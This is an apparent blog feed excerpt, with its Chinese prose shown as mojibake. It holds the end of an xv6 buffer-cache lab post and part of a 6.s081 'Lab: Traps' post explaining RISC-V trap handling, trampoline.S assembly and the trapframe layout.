æ¥ç¼“å†²ç£ç›˜å—ã€‚åœ¨éå†æœŸé—´ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ç›´æŒæœ‰åŸå“ˆå¸Œæ¡¶çš„é”ï¼Œè¿™å¯èƒ½ä¼šæé«˜é”ç«äº‰ã€‚</p><p>ç¼“è§£å“ˆå¸Œæ¡¶é”ç«äº‰çš„ä¸€ä¸ªæ€è€ƒæ˜¯ buffer cache ç»´æŠ¤ä¸€ä¸ªç©ºé—² buffers é“¾è¡¨ï¼ˆå½“ç„¶ä¹Ÿéœ€è¦ä¸Šè‡ªæ—‹é”ï¼‰ï¼Œè¿™æ · <code>bget</code> æ¯æ¬¡éƒ½ä»ç©ºé—²é“¾è¡¨ä¸­æ‹¿ buffer ï¼Œå½“ <code>refcnt</code> ä¸º 0 æ—¶ï¼Œ<code>brelse</code> è´Ÿè´£å°† buffer åŠ åˆ°ç©ºé—²é“¾è¡¨ä¸­ã€‚è™½ç„¶ä¸Šé¢çš„æ–¹æ¡ˆä¸€æ–¹é¢ç®€åŒ–äº† Â <code>bget</code>Â  çš„ cache miss é€»è¾‘ï¼Œä½†å¦ä¸€æ–¹é¢å¸¦æ¥äº† buffer åœ¨ä¸¤ä¸ªé“¾è¡¨é—´ç§»åŠ¨çš„å¼€é”€ï¼Œæ¯æ¬¡æ“ä½œéƒ½éœ€è¦æŒæœ‰ä¸¤æŠŠé”ï¼Œè€Œç©ºé—²é“¾è¡¨çš„é”æ˜¯æ‰€æœ‰å“ˆå¸Œæ¡¶å…±äº«çš„ï¼Œè¿™å¯èƒ½åˆä¼šé€ æˆç©ºé—²é“¾è¡¨é”çš„ç«äº‰ã€‚</p><p>é‚£ä¹ˆé‡‡å–å“ªä¸€ä¸ªæ–¹æ¡ˆæ›´å¥½å‘¢ï¼Ÿè¿™æ²¡æœ‰ä¸€ä¸ªç»å¯¹çš„ç­”æ¡ˆï¼Œå…·ä½“å¾—çœ‹å·¥ä½œè´Ÿè½½ï¼š</p><ul><li>å¦‚æœ<strong>ç¼“å­˜å‘½ä¸­ç‡éå¸¸é«˜</strong>ï¼Œ<code>brelse</code>Â  ä¹Ÿç›¸å¯¹ä¸é¢‘ç¹ï¼Œé‚£ä¹ˆç©ºé—²æ± æ–¹æ¡ˆä¼šæ›´å¥½ï¼Œå› ä¸ºå®ƒåœ¨ cache miss æ—¶è¡¨ç°å¾—éå¸¸é«˜æ•ˆã€‚</li><li>å¦‚æœ<strong>ç¼“å­˜å‘½ä¸­ç‡ä¸é«˜</strong>ï¼Œå¹¶ä¸” buffer çš„ç”Ÿå‘½å‘¨æœŸå¾ˆçŸ­ï¼ˆé¢‘ç¹åœ°è¢«åˆ†é…å’Œé‡Šæ”¾ï¼Œå±€éƒ¨æ€§å¼±ï¼‰ï¼Œé‚£ä¹ˆæ–°æ–¹æ¡ˆçš„å…¨å±€ç©ºé—²é“¾è¡¨é”å¾ˆå¯èƒ½ä¼šæˆä¸ºæ–°çš„ç“¶é¢ˆã€‚</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Before writing code, make sure to read the following parts from theÂ &lt;a href=&quot;https://pdos.csail.mit.edu/6.828/2024/xv6/book-</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>6.s081 Lab: Traps</title>
    <link href="http://example.com/2025/07/08/Lab-Traps/"/>
    <id>http://example.com/2025/07/08/Lab-Traps/</id>
    <published>2025-07-08T13:09:32.852Z</published>
    <updated>2025-07-08T13:20:39.256Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Before you start coding, read Chapter 4 of theÂ <a href="https://pdos.csail.mit.edu/6.828/2024/xv6/book-riscv-rev4.pdf">xv6 book</a>, and related source files:<br><code>kernel/trampoline.S</code>: the assembly involved in changing from user space to kernel space and back<br><code>kernel/trap.c</code>: code handling all interrupts</p></blockquote><p>åœ¨è¿™ä¸ªå®éªŒä¸­æˆ‘ä»¬å°†ä¼šç†è§£åœ¨ä¹‹å‰ system call ä¸­ xv6 æ˜¯å¦‚ä½•å®ç°ç”±ç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€æ‰§è¡Œç³»ç»Ÿè°ƒç”¨çš„ï¼Œè€Œè¿™ç§æ¨¡å¼çš„åˆ‡æ¢ä¹Ÿå­˜åœ¨äºä¸Šä¸‹æ–‡åˆ‡æ¢ä¸­ï¼Œå®ƒä»¬çš„å®ç°éƒ½ä¾èµ–äº Trap ã€‚</p><hr><h1 id="rtfmxv6-é™·é˜±æœºåˆ¶"><a class="markdownIt-Anchor" href="#rtfmxv6-é™·é˜±æœºåˆ¶"></a> RTFMï¼šxv6 é™·é˜±æœºåˆ¶</h1><p>è¿™ä¸€ç« çš„ä¸»è¦é˜è¿°äº† Â <strong>CPU æ§åˆ¶æƒ</strong>æ˜¯å¦‚ä½•åœ¨<strong>ç”¨æˆ·ç¨‹åº</strong>å’Œ<strong>æ“ä½œç³»ç»Ÿå†…æ ¸</strong>ä¹‹é—´å®‰å…¨ã€å¯æ§åœ°è½¬ç§»çš„ã€‚è¿™åŒ…æ‹¬äº†ä¸‰ç§ä¸»è¦çš„è½¬ç§»åœºæ™¯ï¼š<strong>ç³»ç»Ÿè°ƒç”¨ (System Call)</strong>ã€<strong>å¼‚å¸¸ (Exception)</strong>Â  å’Œ Â <strong>ä¸­æ–­ (Interrupt)</strong>ã€‚</p><p>CPU æœ‰æ—¶ä¼šä»æ­£å¸¸çš„ç”¨æˆ·ç¨‹åºæˆ–å†…æ ¸ç¨‹åºæ‰§è¡Œæµä¸­ï¼Œ<strong>è¢«è¿«è½¬ç§»</strong>åˆ°ä¸€æ®µé¢„å…ˆå®šä¹‰å¥½çš„ã€å¤„ç†ç‰¹æ®Šäº‹ä»¶çš„å†…æ ¸ä»£ç ï¼Œé€ æˆè¿™ç§æ‰§è¡Œæµçš„åˆ‡æ¢ä¸»è¦æœ‰ä¸‰ç§æƒ…å†µï¼Œåœ¨ xv6 ä¸­æˆ‘ä»¬ç»Ÿç§°ä¸º<strong>é™·é˜± Trap</strong> ã€‚</p><ol><li><strong>ç³»ç»Ÿè°ƒç”¨ (System Call):</strong>Â  ç”¨æˆ·ç¨‹åº<strong>ä¸»åŠ¨</strong>è¯·æ±‚å†…æ ¸æœåŠ¡ï¼ˆå¦‚è¯»å†™æ–‡ä»¶ï¼‰ï¼Œé€šè¿‡ Â <code>ecall</code>Â  æŒ‡ä»¤è§¦å‘ã€‚</li><li><strong>å¼‚å¸¸ (Exception):</strong>Â CPU åœ¨æ‰§è¡ŒæŒ‡ä»¤æ—¶é‡åˆ°<strong>é”™è¯¯</strong>ï¼ˆå¦‚é™¤ä»¥é›¶ã€è®¿é—®æ— æ•ˆå†…å­˜åœ°å€ã€æ‰§è¡Œéæ³•æŒ‡ä»¤ï¼‰ã€‚</li><li><strong>ä¸­æ–­ (Interrupt):</strong>Â  æ¥è‡ª<strong>ç¡¬ä»¶è®¾å¤‡</strong>çš„ä¿¡å·ï¼ˆå¦‚å®šæ—¶å™¨åˆ°æ—¶ã€ç£ç›˜æ“ä½œå®Œæˆã€é”®ç›˜è¾“å…¥ï¼‰ï¼Œå®ƒä¼šæ‰“æ–­ CPU å½“å‰çš„å·¥ä½œã€‚</li></ol><p>ä¸ºäº†éš”ç¦»ç”¨æˆ·å±‚ç¨‹åºå’Œç¡¬ä»¶ä»¥å®ç°ä¿æŠ¤ï¼Œæ“ä½œç³»ç»Ÿé€šè¿‡ Trapï¼ˆå…·ä½“è¡¨ç°ä¸ºç³»ç»Ÿè°ƒç”¨ï¼‰ä¸ºç”¨æˆ·ç¨‹åºæä¾›æ–‡ä»¶ã€è¿›ç¨‹ã€å†…å­˜ç­‰æ‰€æœ‰æœåŠ¡ï¼›ä¸ºäº†å®ç°åˆ†æ—¶å¤šä»»åŠ¡ (Multitasking)ï¼Œé€šè¿‡å®šæ—¶å™¨ä¸­æ–­ï¼ˆä¸€ç§ Trapï¼‰ï¼Œå†…æ ¸å¯ä»¥å¼ºåˆ¶æ”¶å› CPU æ§åˆ¶æƒï¼Œè¿›è¡Œè¿›ç¨‹è°ƒåº¦ï¼Œä»è€Œå®ç°å¹¶å‘ã€‚ä¸¤è€…éƒ½éœ€è¦è¿›è¡Œä¸€å®šç¨‹åº¦çš„ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œcontext switch æ­£æ˜¯ trap å¤„ç†é€»è¾‘çš„ä¸€éƒ¨åˆ†ã€‚</p><p>å½“ä¸€ä¸ªé™·é˜±å‘ç”Ÿæ—¶ï¼Œé¦–å…ˆç”± Â <strong>(1) CPU ç¡¬ä»¶</strong>Â  è‡ªåŠ¨è¿›è¡Œåˆæ­¥å¤„ç†ï¼Œä¿å­˜ä¸€äº›å…³é”®å¯„å­˜å™¨ï¼Œåœ¨ <code>scause</code> å¯„å­˜å™¨ä¸­è®¾ç½®ä¸€ä¸ªç ä»¥è®°å½• trap ç±»å‹ï¼Œå¹¶è·³è½¬åˆ°å†…æ ¸å…¥å£ï¼ˆåœ°å€å­˜å‚¨åœ¨ Â <code>stvec</code>å¯„å­˜å™¨ä¸­ï¼Œxv6 ä¼šåœ¨å¯åŠ¨æ—¶å°† Â <code>uservec</code>Â  æˆ– Â <code>kernelvec</code>Â  çš„åœ°å€å†™å…¥ Â <code>stvec</code>ï¼‰ã€‚ç„¶åï¼Œç”± Â <strong>(2) æ±‡ç¼–ä»£ç </strong>Â  å®Œæˆæ‰€æœ‰å…¶ä»–çš„é€šç”¨å¯„å­˜å™¨çš„ä¿å­˜å’Œç¯å¢ƒå‡†å¤‡ï¼ˆæ ˆç¯å¢ƒï¼‰ï¼Œå¹¶è°ƒç”¨ C å‡½æ•°ï¼ˆDispatch Functionï¼‰ã€‚æ¥ç€ï¼Œç”± Â <strong>(3) C è¯­è¨€çš„åˆ†å‘å‡½æ•°</strong>Â  æ ¹æ®é™·é˜±åŸå› ï¼ˆ<code>scause</code>ï¼‰ï¼Œå†³å®šè°ƒç”¨ Â <strong>(4) æœ€ç»ˆçš„æœåŠ¡ç¨‹åº</strong>ã€‚æœ€åï¼Œxv6 é™·é˜±æœºåˆ¶çš„æ•´ä¸ªè®¾è®¡åŸºäºä¸€ä¸ªé‡è¦çš„å†³ç­–ï¼šä¸ºäº†æ–¹ä¾¿å’Œå®‰å…¨ï¼Œå°†<strong>æ¥è‡ªç”¨æˆ·æ€çš„é™·é˜±</strong>å’Œ<strong>æ¥è‡ªå†…æ ¸æ€çš„é™·é˜±</strong>ç”¨ä¸¤å¥—ä¸åŒçš„ä»£ç è·¯å¾„æ¥å¤„ç†ã€‚</p><h2 id="æ¥è‡ªç”¨æˆ·æ€çš„-trap"><a class="markdownIt-Anchor" href="#æ¥è‡ªç”¨æˆ·æ€çš„-trap"></a> æ¥è‡ªç”¨æˆ·æ€çš„ Trap</h2><p>æˆ‘ä»¬å…ˆæ¥è¯¦ç»†çœ‹çœ‹åœ¨ç”¨æˆ·æ€ä¸‹é‡åˆ° trap æ—¶çš„å¤„ç†æµç¨‹ã€‚</p><p>å›é¡¾ä¸€ä¸‹å†…æ ¸ç©ºé—´å’Œç”¨æˆ·è¿›ç¨‹ç©ºé—´çš„å¸ƒå±€ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°åœ¨æœ€é«˜è™šæ‹Ÿåœ°å€ <code>MAXVA</code> æ˜ å°„äº†ä¸€ä¸ªå…·æœ‰ R-X æƒé™çš„ <code>Trampoline</code> é¡µï¼Œè¿™ä¸ªå†…å­˜é¡µé‡Œé¢å®é™…ä¸Šå°±æ˜¯æˆ‘ä»¬<strong>å¯¹äº trap é¢„å…ˆå®šä¹‰å¥½çš„å¤„ç†æµç¨‹ï¼ˆtrap handlerï¼‰</strong>ã€‚ <code>trampoline.S</code> ä¸­çš„ <code>uservec</code> ä¸ <code>userret</code> å°±æ˜¯ trap æœ€å¼€å§‹çš„â€œè½¯ä»¶â€å…¥å£/å‡ºå£ã€‚</p><h3 id="1-risc-v-ç¡¬ä»¶å¤„ç†é€»è¾‘"><a class="markdownIt-Anchor" href="#1-risc-v-ç¡¬ä»¶å¤„ç†é€»è¾‘"></a> 1. RISC-V ç¡¬ä»¶å¤„ç†é€»è¾‘</h3><p>åœ¨è½¯ä»¶å¤„ç†é€»è¾‘ä¹‹å‰ï¼ŒRISC-V ç¡¬ä»¶ä¼šä¿å­˜å½“å‰ pc åˆ° <code>sepc</code>ï¼Œè®¾ç½® <code>sstatus</code> ï¼ˆä¼˜å…ˆçº§ï¼Œä¸­æ–­ä½¿èƒ½â€¦ï¼‰ , <code>scause</code> ï¼ˆtrap ç±»å‹ï¼‰ï¼Œç”± U-mode åˆ‡æ¢ä¸º S-modeï¼Œæ¥ä¸‹æ¥æŠŠ <code>stvec</code> ä¸­ trap å¤„ç†å‘é‡çš„åœ°å€å†™å…¥ pc ï¼Œç„¶åè·³è½¬ <code>stvec</code> é¢„è®¾çš„å…¥å£ï¼Œå³ xv6 åˆå§‹åŒ–æ—¶å†™åˆ° <code>stvec</code> ä¸­çš„ <code>uservec</code> æˆ– <code>kernelvec</code>ã€‚</p><h3 id="2-uservec-ç”¨æˆ·é™·é˜±å¤„ç†å‘é‡"><a class="markdownIt-Anchor" href="#2-uservec-ç”¨æˆ·é™·é˜±å¤„ç†å‘é‡"></a> 2. uservec ç”¨æˆ·é™·é˜±å¤„ç†å‘é‡</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#   kernel/trampoline.S</span><br><span class="line">uservec:</span><br><span class="line"># ä¿å­˜ç”¨æˆ·è¿›ç¨‹çš„ a0 å¯„å­˜å™¨åˆ° sscratch ä¸­</span><br><span class="line">        csrw sscratch, a0</span><br><span class="line"></span><br><span class="line">        li a0, TRAPFRAME</span><br><span class="line"></span><br><span class="line">        # ä¿å­˜æ‰€æœ‰å¯„å­˜å™¨å€¼åˆ° TRAPFRAME</span><br><span class="line">        sd ra, 40(a0)</span><br><span class="line">        sd sp, 48(a0)</span><br><span class="line"># ...</span><br><span class="line">        sd s0, 96(a0)</span><br><span class="line">        sd s1, 104(a0)</span><br><span class="line">        sd a1, 120(a0)   # æ³¨æ„ï¼ša0 çš„å€¼ä¸º TRAPFRAME</span><br><span class="line"># ...</span><br><span class="line">        sd t6, 280(a0)</span><br><span class="line"></span><br><span class="line">    # å–å› a0 çš„å€¼ä¿å­˜</span><br><span class="line">        csrr t0, sscratch</span><br><span class="line">        sd t0, 112(a0)</span><br><span class="line"></span><br><span class="line"># è®¾ç½®å†…æ ¸æ€æ‰§è¡Œç¯å¢ƒ</span><br><span class="line">        # initialize kernel stack pointer, from p-&gt;trapframe-&gt;kernel_sp</span><br><span class="line">        ld sp, 8(a0)</span><br><span class="line"></span><br><span class="line">        # make tp hold the current hartid, from p-&gt;trapframe-&gt;kernel_hartid</span><br><span class="line">        ld tp, 32(a0)</span><br><span class="line"></span><br><span class="line">        # load the address of usertrap(), from p-&gt;trapframe-&gt;kernel_trap</span><br><span class="line">        ld t0, 16(a0)</span><br><span class="line"></span><br><span class="line">        # fetch the kernel page table address, from p-&gt;trapframe-&gt;kernel_satp.</span><br><span class="line">        ld t1, 0(a0)</span><br><span class="line"></span><br><span class="line">        sfence.vma zero, zero</span><br><span class="line">        csrw satp, t1</span><br><span class="line">        sfence.vma zero, zero</span><br><span class="line"></span><br><span class="line">        # è·³è½¬åˆ° usertrap()</span><br><span class="line">        jr t0</span><br></pre></td></tr></table></figure><p>æ­¤å‰ CPU ç¡¬ä»¶åªä¿å­˜äº†ä¸€äº›å…³é”®çš„å¯„å­˜å™¨ï¼Œä¸ºäº†å¤„ç†è¿”å›æ—¶èƒ½ä¿è¯è¿›ç¨‹çš„ä¸Šä¸‹æ–‡å®Œæ•´ï¼Œ <code>uservec</code> éœ€è¦ä¿å­˜æ‰€æœ‰çš„å¯„å­˜å™¨å€¼åˆ° Trapframe é¡µä¸­ã€‚ Trapframe é¡µä½äº Trapoline é¡µä¹‹ä¸‹ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰å±äºè‡ªå·±çš„ Trapframe é¡µï¼Œéƒ½æ˜ å°„åˆ°äº†åŒä¸€è™šæ‹Ÿåœ°å€ <code>TRAPFRAME</code>ï¼Œé™¤äº†ç”¨äºä¿å­˜é€šç”¨å¯„å­˜å™¨å€¼ï¼Œè¿˜ä¿å­˜äº†å¦‚ä¸‹çš„ä¸€äº›å¯„å­˜å™¨å€¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/proc.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> &#123;</span></span><br><span class="line">  <span class="comment">/*   0 */</span> uint64 kernel_satp;   <span class="comment">// å†…æ ¸é¡µè¡¨åœ°å€</span></span><br><span class="line">  <span class="comment">/*   8 */</span> uint64 kernel_sp;     <span class="comment">// ç”¨æˆ·å†…æ ¸æ ˆçš„æ ˆæŒ‡é’ˆ</span></span><br><span class="line">  <span class="comment">/*  16 */</span> uint64 kernel_trap;   <span class="comment">// usertrap() è™šæ‹Ÿåœ°å€</span></span><br><span class="line">  <span class="comment">/*  24 */</span> uint64 epc;           <span class="comment">// ä¿å­˜çš„ pc</span></span><br><span class="line">  <span class="comment">/*  32 */</span> uint64 kernel_hartid; <span class="comment">// saved kernel tp</span></span><br><span class="line">  <span class="comment">/*  .. */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ä¿å­˜å¯„å­˜å™¨çš„å¼€å§‹ï¼Œæˆ‘ä»¬é‡åˆ°äº†ä¸€ä¸ªæ­»é”é—®é¢˜ï¼šåœ¨<strong>åŸºå€å˜å€</strong>çš„å¯»å€æ–¹å¼ä¸Šï¼Œæˆ‘ä»¬éœ€è¦æœ‰ä¸€ä¸ªå¯„å­˜å™¨æ¥ä¿å­˜åŸºå€ <code>TRAPFRAME</code>ï¼Œä½†æ˜¯ç°åœ¨è¿™äº›å¯„å­˜å™¨çš„å€¼éƒ½ç­‰å¾…ç€ä¿å­˜ï¼Œé‚£ä¹ˆåˆå¦‚ä½•åœ¨ä¸ä¿®æ”¹å¯„å­˜å™¨å€¼çš„æ¡ä»¶ä¸‹æŠŠå¯„å­˜å™¨çš„å€¼ä¿å­˜åˆ°å†…å­˜ Trapframe ä¸­å‘¢ï¼Ÿ</p><p>xv6 ä½¿ç”¨äº†ä¸€ä¸ªç‰¹æ®Šçš„<strong>æ§åˆ¶å’ŒçŠ¶æ€å¯„å­˜å™¨ (CSR)</strong>â€”â€”<code>sscratch</code> æ¥æ‰“ç ´æ­»é”ã€‚å…ˆæŠŠ <code>a0</code> çš„å€¼ä¿å­˜åˆ° <code>sscratch</code> ä½œä¸­è½¬ï¼Œå°±å¯ä»¥æŠŠ <code>a0</code> ä½œä¸ºåŸºå€å¯„å­˜å™¨ä¿å­˜å…¶ä»–å¯„å­˜å™¨çš„å€¼åˆ°å†…å­˜ï¼Œæœ€ååœ¨æŠŠ <code>sscratch</code> ä¿å­˜åˆ° <code>trapframe-&gt;a0</code> ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬è¦ä¸ºé™·å…¥å†…æ ¸æ€æ‰§è¡Œå…·ä½“çš„ trap å¤„ç†é€»è¾‘ <code>usertrap()</code> åšå‡†å¤‡ï¼š</p><ol><li><code>ld sp, 8(a0)</code> è®¾ç½®å†…æ ¸æ ˆæŒ‡é’ˆ</li><li><code>ld tp, 32(a0)</code> æ¢å¤ Â tpÂ  å¯„å­˜å™¨ï¼Œä½¿å…¶åŒ…å«æ­£ç¡®çš„ Â hartid</li><li><code>ld t0, 16(a0)</code> å‡†å¤‡ <code>usertrap</code> çš„è·³è½¬åœ°å€</li><li><code>ld t1, 0(a0)</code> ä¸ <code>csrw satp, t1</code> æŠŠ <code>satp</code> åˆ‡æ¢ä¸ºå†…æ ¸é¡µè¡¨ï¼ˆé™·å…¥å†…æ ¸çš„å…³é”®ï¼ï¼‰</li></ol><p>è™½ç„¶åœ¨ CPU åœ¨ç¡¬ä»¶é˜¶æ®µå·²ç»æå‡ç‰¹æƒçº§åˆ° Supervisor-mode ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰ä¿®æ”¹ <code>satp</code> ï¼Œä¹Ÿå°±æ˜¯è¯´åé¢å¯¹äºå†…å­˜çš„è®¿é—®éƒ½æ˜¯åŸºäºç”¨æˆ·è¿›ç¨‹æ ¹é¡µè¡¨çš„ï¼Œè€Œæˆ‘<strong>è®¤ä¸ºç”¨æˆ·æ€ä¸‹é™·åˆ°å†…æ ¸æ€çš„å…³é”®æ˜¯ <code>satp</code> åˆ‡æ¢ä¸ºå†…æ ¸é¡µè¡¨ï¼Œæ­¤æ—¶ CPU çš„å†…å­˜è§†å›¾æ‰æ˜¯å†…æ ¸åœ°å€ç©ºé—´</strong>ï¼</p><p>æœ€åæˆ‘ä»¬å…³æ³¨ <code>jr t0</code> è·³è½¬åˆ° Trampoline ä¸­çš„ <code>usertrap()</code> çš„ç»†èŠ‚ã€‚å¯„å­˜å™¨ <code>t0</code> ä¿å­˜ <code>p-&gt;trapframe-&gt;kernel_trap</code> ï¼Œæ˜¯ç”¨æˆ·ç©ºé—´ä¸­ <code>usertrap()</code> çš„è™šæ‹Ÿåœ°å€ï¼Œè€Œåœ¨è·³è½¬æ—¶é¡µè¡¨å·²ç»åˆ‡æ¢ä¸ºäº†å†…æ ¸é¡µè¡¨ï¼Œä½†æ˜¯ Trampoline é¡µè¢«æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´å’Œå†…å­˜ç©ºé—´çš„åŒä¸€ä¸ªè™šæ‹Ÿåœ°å€ä¸Šï¼Œæ‰€ä»¥ <code>jr</code> å¯ä»¥æ­£ç¡®åœ°è·³åˆ° <code>usertrap()</code> å…¥å£ã€‚</p><p>é™¤æ­¤ä¹‹å¤–å†æä¸€ä¸ªç»†èŠ‚ï¼Œ<code>p-&gt;trapframe</code> ä¿å­˜çš„æ˜¯ Trapframe æ˜ å°„çš„ç‰©ç†é¡µçš„ç‰©ç†åœ°å€ï¼Œè€Œè¿™ä¸ªé¡µæ²¡æœ‰è®¾ç½® PTE_U ï¼Œå› æ­¤ç”¨æˆ·æ— æ³•è®¿é—®ã€‚ç”¨æˆ·è¿›ç¨‹çš„ Trapframe å¹¶æ²¡æœ‰åƒ Trampoline ä¸€æ ·è¢«æ˜ å°„åˆ°å†…æ ¸ç©ºé—´ä¸­ï¼Œä½†æ˜¯ç”±äºå†…æ ¸è™šæ‹Ÿåœ°å€ä¸ç‰©ç†å†…å­˜åœ°å€ä¸€ä¸€æ˜ å°„ï¼Œæ‰€ä»¥å†…æ ¸è®¿é—® <code>p-&gt;trapframe</code> è¿™ä¸ªè™šæ‹Ÿåœ°å€ï¼Œå®é™…ä¸Šä¹Ÿå°±æ˜¯è®¿é—®å¯¹åº”è¿›ç¨‹çš„ Trapframe çš„ç‰©ç†åœ°å€ã€‚ï¼ˆå¾ˆç²¾å·§çš„è®¾è®¡ï¼‰</p><h3 id="3-usertrap-é™·é˜±å¤„ç†åˆ†å‘"><a class="markdownIt-Anchor" href="#3-usertrap-é™·é˜±å¤„ç†åˆ†å‘"></a> 3. usertrap() é™·é˜±å¤„ç†åˆ†å‘</h3><p>è¿™é‡Œæˆ‘å°±ä¸è´´ <code>usertrap()</code> çš„æ¡†æ¶æºç äº†ï¼Œä¸»è¦çœ‹å…³é”®çš„å‡ ä¸ªæ“ä½œã€‚</p><p><code>w_stvec((uint64)kernelvec)</code> åœ¨è¿›å…¥ <code>usertrap</code> åçš„ç¬¬ä¸€æ­¥æ“ä½œæ˜¯æŠŠ <code>stvec</code> çš„ trap å‘é‡åœ°å€æ”¹ä¸º <code>kernelvec</code>ï¼Œå› ä¸ºæˆ‘ä»¬å·²ç»å¤„äºå†…æ ¸æ€ä¸‹äº†ï¼Œæ‰€ä»¥åœ¨è¿™ä¸ªçŠ¶æ€ä¸‹é‡åˆ°çš„ trap éƒ½éœ€è¦ç”±å†…æ ¸çš„ trap å¤„ç†å‡½æ•° <code>kernelvec</code> æ¥å¤„ç†ï¼ˆå…·ä½“çš„é€»è¾‘åé¢å†çœ‹ï¼‰ã€‚</p><p><code>p-&gt;trapframe-&gt;epc = r_sepc()</code> ä¿å­˜è¢«æ‰“æ–­çš„ç”¨æˆ·æŒ‡ä»¤çš„åœ°å€ã€‚é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œ<strong>ä¸ºä»€ä¹ˆä¸åœ¨ <code>uservec</code> ç»Ÿä¸€åœ°ä¿å­˜ epcï¼Œè€Œæ˜¯è¦ç”± <code>usertrap</code> æ¥å®ç°å‘¢ï¼Ÿ</strong> å½“ä¸€ä¸ªé™·é˜±ä»ç”¨æˆ·æ€å‘ç”Ÿæ—¶ CPU ä¼šå°† Â SIEÂ  ä½æ¸…é›¶ï¼Œä»è€Œç¦ç”¨åç»­çš„ S-mode ä¸­æ–­ï¼Œå› æ­¤æˆ‘ä»¬ä¸ç”¨æ‹…å¿ƒåœ¨ç”¨æˆ·æ€ä¸‹æ‰§è¡Œ <code>uservec</code> æ—¶ä¸ä¼šè¢«å®šæ—¶å™¨ä¸­æ–­ï¼Œè¿™å¯ä»¥ä¿è¯åŸå­æ€§ï¼Œä¹Ÿå°±æ˜¯è¯´ <code>sepc</code> æ˜¯ç¨³å®šçš„ã€‚å¯¹äºæˆ‘çš„é—®é¢˜ï¼ŒAI çš„å›ç­”å¦‚ä¸‹ï¼š</p><blockquote><p>xv6 çš„è®¾è®¡è€…é€‰æ‹©åœ¨ Â usertrapÂ  ä¸­ä¿å­˜ Â sepcï¼Œè¿™æ›´å¤šæ˜¯å‡ºäº<strong>è½¯ä»¶å·¥ç¨‹å’Œè®¾è®¡æ¨¡å¼</strong>çš„è€ƒè™‘ï¼š</p><blockquote><ol><li><strong>èŒè´£åˆ†ç¦»:</strong>Â  è®©æ±‡ç¼–ï¼ˆ<code>uservec</code>ï¼‰ä¸“æ³¨äºâ€œåˆ‡æ¢ä¸Šä¸‹æ–‡â€ï¼Œè®© C è¯­è¨€ï¼ˆ<code>usertrap</code>ï¼‰ä¸“æ³¨äºâ€œå¤„ç†é€»è¾‘â€ã€‚</li><li><strong>é€»è¾‘é›†ä¸­:</strong>Â  å°†æ‰€æœ‰ä¸é™·é˜±â€œåŸå› â€ç›¸å…³çš„å¯„å­˜å™¨ï¼ˆscause,Â sepc,Â stvalï¼‰çš„å¤„ç†éƒ½æ”¾åœ¨åŒä¸€ä¸ªåœ°æ–¹ï¼ˆ<code>usertrap</code>Â  çš„å¼€å¤´ï¼‰ã€‚</li><li><strong>ä»£ç æ¸…æ™°æ€§:</strong>Â C è¯­è¨€çš„è¡¨è¾¾æ¯”æ±‡ç¼–æ›´æ¸…æ™°æ˜äº†ã€‚</li></ol></blockquote></blockquote><p>åé¢æ ¹æ® <code>scause</code> çš„æ ‡è¯†æŠŠé™·é˜±å¤„ç†åˆ†åˆ«åˆ†å‘åˆ° <code>syscall()</code> ç³»ç»Ÿè°ƒç”¨å¤„ç†ï¼Œ<code>devintr()</code> ä¸­æ–­å¤„ç†ä»¥åŠå¼‚å¸¸å¤„ç†ã€‚trap å¤„ç†å®Œåè·³è½¬åˆ° <code>usertrapret()</code> ã€‚</p><h3 id="4-usertrapret-è¿”å›ç”¨æˆ·ç©ºé—´"><a class="markdownIt-Anchor" href="#4-usertrapret-è¿”å›ç”¨æˆ·ç©ºé—´"></a> 4. usertrapret() è¿”å›ç”¨æˆ·ç©ºé—´</h3><p><code>usertrapret()</code> å¯ä»¥çœ‹ä½œæ˜¯ <code>usertrap()</code> çš„é€†æ“ä½œï¼Œå®ƒçš„ä»»åŠ¡æ˜¯å‡†å¤‡å¥½ CPU çš„çŠ¶æ€ï¼ˆè¿”å›ç”¨æˆ·ç©ºé—´ï¼‰ï¼Œä»¥ä¾¿ Â <code>sret</code>Â  æŒ‡ä»¤èƒ½å¤Ÿå°†æ§åˆ¶æƒå®Œç¾åœ°äº¤è¿˜ç»™è¢«æ‰“æ–­çš„ç”¨æˆ·ç¨‹åºã€‚</p><p>ç¬¬ä¸€æ­¥è¡Œä¸º <code>intr_off()</code> åœ¨åˆ‡æ¢ <code>satp</code> ä¸­é™·é˜±å‘é‡å‰å…³é—­ä¸­æ–­ï¼Œè¿™æ˜¯é¿å…åœ¨å®Œæˆ <code>kernelvec</code> åˆ‡æ¢ä¸ºç”¨æˆ·æ€é™·é˜±å¤„ç†å‘é‡ <code>uservec</code> 